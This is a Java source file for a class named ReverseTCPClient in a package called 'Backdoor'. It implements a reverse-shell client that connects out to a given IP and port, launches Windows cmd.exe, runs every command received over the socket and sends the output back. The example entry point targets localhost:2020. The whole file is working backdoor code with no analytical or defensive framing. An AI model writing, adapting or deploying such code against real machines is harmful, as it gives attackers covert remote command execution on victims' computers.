package com.company.Backdoor.ReverseTCP;

import com.company.Backdoor.BackdoorConstants;


import java.io.*;
import java.net.Socket;


public class ReverseTCPClient
{
    private Socket socket;
    private int port;
    private String ip;
    private DataInputStream dis;
    private PrintWriter writer;
    private BufferedReader reader;

    public ReverseTCPClient(String ip, int port)
    {
        try
        {
            this.port = port;
            this.ip = ip;
            socket = new Socket(ip, port);
            dis = new DataInputStream(socket.getInputStream());
            writer = new PrintWriter(socket.getOutputStream());
            reader = new BufferedReader(new InputStreamReader(dis));
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }


    private String response(BufferedReader reader) throws IOException
    {
        String line;
        String str = "";
        while ((line = reader.readLine()) != null)
        {
            if (line.endsWith(BackdoorConstants.END_OF_COMMAND))
                break;
            str += line+"\n";
        }
        return str+"\n"+BackdoorConstants.END_OF_COMMAND;
    }


    private String reverseShell(String command, Process process) throws IOException
    {
        PrintWriter writer = new PrintWriter(process.getOutputStream());
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

        writer.println(command);
        writer.println(BackdoorConstants.END_OF_COMMAND);
        writer.flush();

        return response(reader);
    }



    private Runtime createRunTime()
    {
        return Runtime.getRuntime();
    }


    public void run()
    {
        try
        {
            Runtime runtime = createRunTime();
            Process process = runtime.exec("C:\\Windows\\System32\\cmd.exe");

            while (true)
            {
                String command = reader.readLine();

                if (command.equals("exit"))
                    break;
                else
                {
                    String response = reverseShell(command,process);
                    writer.println(response);
                    writer.flush();
                    runtime = createRunTime();
                }
            }
            System.out.println("Connection closed!");
            socket.close();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public static void main(String[] args)
    {
        ReverseTCPClient client = new ReverseTCPClient("localhost",2020);
        client.run();
    }
}
